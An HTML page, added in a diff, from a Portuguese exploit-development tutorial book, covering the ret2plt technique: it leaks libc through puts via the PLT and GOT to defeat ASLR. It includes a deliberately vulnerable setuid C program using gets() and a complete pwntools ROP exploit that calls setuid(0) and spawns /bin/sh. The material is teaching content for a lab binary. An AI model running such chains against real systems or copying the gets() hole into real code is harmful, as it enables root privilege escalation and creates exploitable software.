@@ -1,0 +1,339 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>ret2plt - Um Livrinho Sobre Exploit Dev</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <base href="../../">
+
+        <link rel="stylesheet" href="book.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
+        <link rel="shortcut icon" href="favicon.png">
+
+        <!-- Font Awesome -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme -->
+        
+
+        
+
+        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
+        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
+        <script>
+            if (typeof Clipboard == 'undefined') {
+                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch JQuery from CDN but have a local fallback -->
+        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+        <script>
+            if (typeof jQuery == 'undefined') {
+                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
+        <script src="store.js"></script>
+
+    </head>
+    <body class="light">
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme = store.get('mdbook-theme');
+            if (theme === null || theme === undefined) { theme = 'light'; }
+            $('body').removeClass().addClass(theme);
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var sidebar = store.get('mdbook-sidebar');
+            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
+            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
+        </script>
+
+        <div id="sidebar" class="sidebar">
+            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/stack.html"><strong>2.</strong> Stack</a></li><li><a href="./stack/phoenix/setup.html"><strong>3.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>3.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>3.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>3.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>3.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>3.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>3.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>3.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> Mitigações</a></li><li><a href="./stack/ret2libc.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Protostar Stack Six</li><li><strong>5.2.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><a href="./stack/gotplt.html"><strong>6.</strong> GOT e PLT</a></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>7.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><a href="./stack/rop/ROPE/pivot.html"><strong>7.2.1.</strong> ROPE: pivot</a></li></ul></li></ul></li><li><a href="./stack/rop/SROP/SROP.html"><strong>8.</strong> SROP</a></li><li><a href="./stack/ASLR/aslr.html"><strong>9.</strong> Derrotando ASLR</a></li><li><ul class="section"><li><a href="./stack/ASLR/corromperGOT.html"><strong>9.1.</strong> Corromper GOT</a></li><li><a href="./stack/ASLR/ret2plt.html" class="active"><strong>9.2.</strong> ret2plt</a></li><li><a href="./stack/ASLR/brute32.html"><strong>9.3.</strong> Bruteforce (32 bits)</a></li></ul></li><li><strong>10.</strong> Derrotando PIE</li><li><strong>11.</strong> Derrotando Canaries</li><li><a href="./stack/leakAll.html"><strong>12.</strong> Extra: Leakando tudo</a></li><li class="spacer"></li><li><a href="./heap/heap.html"><strong>13.</strong> Heap</a></li><li><a href="./heap/intro.html"><strong>14.</strong> Intro</a></li><li><strong>15.</strong> Bugs Gerais</li><li><ul class="section"><li><strong>15.1.</strong> UAF</li><li><ul class="section"><li><a href="./heap/geral/uaf/heap-two.html"><strong>15.1.1.</strong> Exploit Education: Heap Two</a></li></ul></li></ul></li><li><strong>16.</strong> Atacando Malloc</li><li><ul class="section"><li><strong>16.1.</strong> Básico</li><li><ul class="section"><li><strong>16.1.1.</strong> Fastbins Dup</li><li><a href="./heap/basico/HouseOfForce.html"><strong>16.1.2.</strong> House of Force</a></li><li><strong>16.1.3.</strong> Unsafe Unlink</li><li><strong>16.1.4.</strong> Safe Unlink</li><li><strong>16.1.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>16.1.6.</strong> Chunk Faking</li></ul></li><li><strong>16.2.</strong> Intermediário</li><li><ul class="section"><li><strong>16.2.1.</strong> House of Orange</li><li><ul class="section"><li><strong>16.2.1.1.</strong> File Stream Exploitation</li><li><strong>16.2.1.2.</strong> Heap Extension</li><li><strong>16.2.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>16.2.2.</strong> House of Spirit</li></ul></li><li><strong>16.3.</strong> Avançado</li><li><ul class="section"><li><strong>16.3.1.</strong> House of Rust</li><li class="spacer"></li></ul></li></ul></li><li><a href="./linux_internals/linux.html"><strong>17.</strong> Linux Internals</a></li><li><a href="./linux_internals/prerequisitos.html"><strong>18.</strong> Prerequisitos</a></li></ul>
+        </div>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page" tabindex="-1">
+                
+                <div id="menu-bar" class="menu-bar">
+                    <div class="left-buttons">
+                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
+                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
+                    </div>
+
+                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html">
+                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="content" class="content">
+                    <ul>
+<li><a href="./stack/ASLR/ret2plt.html#teoria">Teoria</a></li>
+<li><a href="./stack/ASLR/ret2plt.html#beatbox-puts-puts-puts-beatbox"><BeatBox> Puts Puts Puts </BeatBox></a></li>
+<li><a href="./stack/ASLR/ret2plt.html#exemplo">Exemplo</a>
+<ul>
+<li><a href="./stack/ASLR/ret2plt.html#vulnc">vuln.c</a></li>
+<li><a href="./stack/ASLR/ret2plt.html#exploit">exploit</a></li>
+</ul>
+</li>
+</ul>
+<a class="header" href="./stack/ASLR/ret2plt.html#teoria" id="teoria"><h1>Teoria</h1></a>
+<blockquote>
+<p>Vale a pena revisar GOT e PLT caso precise</p>
+</blockquote>
+<p>Resumo:</p>
+<ul>
+<li>
+<p>A GOT armazena o endereço da funcao apos ser resolvida!</p>
+</li>
+<li>
+<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
+</li>
+<li>
+<p>A PLT checa a GOT, caso o endereço ja tenha sido resolvido, <code>jmp</code> la... caso o endereço ainda nao tenha sido, coordena com <code>ld.so</code> para resolver!</p>
+</li>
+</ul>
+<p>A técnica ret2plt pode ser considerada o ret2libc do mundo com ASLR!</p>
+<p>Da mesma maneira que podíamos retornar para o libc quando o NX foi ativado,
+agora podemos voltar para a PLT!</p>
+<p>Podemos fazer isso pois a PLT (e GOT) nao tem seu endereço alterado pelo ASLR,
+somente por PIE!</p>
+<p>Nos poderíamos usar isso para, por exemplo, chamar system() ... mas existe
+uma alternativa mais divertida!</p>
+<a class="header" href="./stack/ASLR/ret2plt.html#beatbox-puts-puts-puts-beatbox" id="beatbox-puts-puts-puts-beatbox"><h1><BeatBox> Puts Puts Puts </BeatBox></h1></a>
+<p>Nos podemos ler a GOT de uma funcao <strong>JA RESOLVIDA</strong>, e calcular o
+endereço da base do libc, ja que as funções estão a um offset constante!</p>
+<p>Tendo o endereço base do libc, podemos chamar quantas funções quisermos, mesmo
+que nao tenham sido usadas originalmente pelo programa!</p>
+<p>Para fazer isso, vamos usar <code>puts</code>: printa uma <code>string</code> pro terminal!</p>
+<p>Vamos passar entrada para <code>puts na got</code>, assim: <code>puts vai printar o endereço resolvido de puts</code></p>
+<p>Em seguida, nos chamamos main (ou a funcao vulnerável) e executamos o BoF de
+novo, so que agora que a base do libc, podemos usar todo o seu potencial</p>
+<p>Em x86_64 bits nos podemos fazer:</p>
+<pre><code>pop_rdi_gadget
+got.puts
+
+plt.puts    -&gt; rdi = primeiro arg, e rdi aponta para 
+              a got com o endereço resolvido de puts
+
+main
+</code></pre>
+<p>E em x86 bits:</p>
+<pre><code>plt.puts
+main
+got.puts
+</code></pre>
+<p>Para calcular a base do libc a partir desse leak, basta fazer:</p>
+<pre><code class="language-py">leak = int(recv(), 16)
+libc.address = leak - libc.sym.puts
+</code></pre>
+<p><code>libc.sym.*</code> Armazena o offset dentro daquela versão do libc, isto e:
+<code>puts = base + 0x1234</code>, <code>exit = base + 0x4321</code>, <code>system = base + offset</code>, etc...</p>
+<p>Portanto, com <code>leak = puts</code> -&gt; <code>leak = base + 0x1234</code>
+-&gt; <code>base = leak - 0x1234</code> -&gt; <code>base = leak - offset</code></p>
+<p>Agora, basta criar outra payload e enviar o BoF de novo, so que com: setuid + conexão remota + system + exit</p>
+<p>Ou o que raios a sua imaginação bolar :D</p>
+<a class="header" href="./stack/ASLR/ret2plt.html#exemplo" id="exemplo"><h1>Exemplo</h1></a>
+<a class="header" href="./stack/ASLR/ret2plt.html#vulnc" id="vulnc"><h2>vuln.c</h2></a>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+/*
+gcc vuln.c -fno-stack-protector -no-pie -ggdb -z relro -z now -o vuln ;
+sudo chown root vuln ; 
+sudo chmod +s vuln ;
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space ;
+checksec vuln ;
+*/
+
+/* 
+O checksec deve dar:
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+*/
+void vuln() {
+    puts(&quot;Ola :D ! Qual o seu nome?&quot;);
+
+    char buffer[20];
+    gets(buffer);
+}
+
+int main() {
+    vuln();
+
+    return 0;
+}
+</code></pre>
+<a class="header" href="./stack/ASLR/ret2plt.html#exploit" id="exploit"><h2>exploit</h2></a>
+<pre><code class="language-py">#!/usr/bin/python3
+from pwn import *
+from time import sleep
+
+context.binary = elf = ELF(&quot;vuln&quot;)
+libc = elf.libc
+rop = ROP(elf)
+io = process(elf.path)
+io.recvline()
+
+if args.SLEEP: sleep(5)
+
+##################################################
+# 
+# A plt nao tem seu endereco afetado pelo ASLR
+# 
+# Entao podemos chamar uma funcao do libc por 
+# meio dela, sem precisar de leak
+#
+# Assim, vamos chamar puts por meio da plt!
+#
+# Alem disso, a got tambem nao e afetada,
+# e ela armazena o endereco das funcoes resolvidas
+#
+# E oq o puts vai printar? um valor da got!
+# Assim, nos dando o leak do libc
+#
+##################################################
+
+payload = b'A'*40 + flat(
+    rop.find_gadget(['pop rdi', 'ret']).address,
+    elf.got.puts,
+    elf.plt.puts, # call puts(&quot;got.puts&quot;)
+    elf.sym.vuln  # voltar pra vuln 
+)
+
+io.sendline(payload)
+
+##################################################
+#
+# Receber leak
+#
+##################################################
+
+libc.address = int(bytearray(
+    io.recvline()[:-1:])[::-1].hex(),
+    16) - libc.sym.puts
+
+# &gt;&gt;&gt; leak                                      # Botei um valor qualquer 
+#     b'\xf0\xb5[\x16\xc8\x7f\n'
+#
+# &gt;&gt;&gt; leak[:-1:]                                # Remover \n
+#     b'\xf0\xb5[\x16\xc8\x7f'
+#
+# &gt;&gt;&gt; bytearray(leak[:-1:]).hex()               # converter pra hexstring
+#     'f0b55b16c87f'
+#
+# &gt;&gt;&gt; bytearray(leak[:-1:])[::-1].hex()         # Little Endian
+#     '7fc8165bb5f0'
+#
+# &gt;&gt;&gt; int(bytearray(leak[:-1:])[::-1].hex(),16) # int
+#     140497345295856
+
+# Em seguida, leak - offset_puts ===&gt; base_libc
+
+log.success(&quot;Libc Leak: &quot;+hex(libc.address))
+
+##################################################
+#
+# vuln parte 2, o retorno
+#
+##################################################
+
+io.recvline()
+
+payload = b'A'*40 + flat(
+    # Privesc
+    rop.find_gadget(['pop rdi', 'ret']).address,
+    0,
+    libc.sym.setuid,
+    
+    # System
+    rop.find_gadget(['pop rdi', 'ret']).address,
+    next(libc.search(b&quot;/bin/sh\x00&quot;)),
+    libc.sym.system,
+
+    # Exit
+    rop.find_gadget(['pop rdi', 'ret']).address,
+    0,
+    libc.sym.exit
+)
+
+io.sendline(payload)
+io.interactive()
+</code></pre>
+
+                </div>
+
+                <!-- Mobile navigation buttons -->
+                
+                    <a rel="prev" href="./stack/ASLR/corromperGOT.html" class="mobile-nav-chapters previous" title="Previous chapter">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="./stack/ASLR/brute32.html" class="mobile-nav-chapters next" title="Next chapter">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+
+            </div>
+
+            
+                <a href="./stack/ASLR/corromperGOT.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+            
+
+            
+                <a href="./stack/ASLR/brute32.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            
+
+        </div>
+
+
+        <!-- Local fallback for Font Awesome -->
+        <script>
+            if ($(".fa").css("font-family") !== "FontAwesome") {
+                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
+            }
+        </script>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        
+
+        
+
+        
+
+        
+
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS script -->
+        
+
+    </body>
+</html>
